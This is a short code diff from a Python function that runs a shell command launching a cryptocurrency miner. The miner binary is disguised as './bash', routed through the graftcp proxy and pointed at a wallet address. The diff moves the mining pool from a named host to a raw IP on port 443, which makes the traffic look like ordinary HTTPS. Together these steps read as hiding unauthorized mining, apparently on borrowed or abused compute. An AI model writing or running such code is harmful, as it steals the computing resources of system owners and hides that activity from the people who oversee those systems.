@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash -a fishhash -o stratum+tcp://iron.kryptex.network:7017 -u d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.VERTU
+    ./graftcp/graftcp ./bash -a fishhash -o stratum+tcp://104.207.93.53:443 -u d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.ngebor
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
